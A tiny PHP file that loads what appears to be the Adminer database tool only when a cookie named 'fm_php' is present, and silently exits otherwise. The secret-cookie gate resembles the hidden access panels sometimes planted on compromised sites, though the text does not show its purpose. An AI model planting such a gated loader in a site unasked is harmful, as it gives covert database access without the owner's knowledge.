<?php

isset($_COOKIE["fm_php"]) or exit;

require 'adminer-en';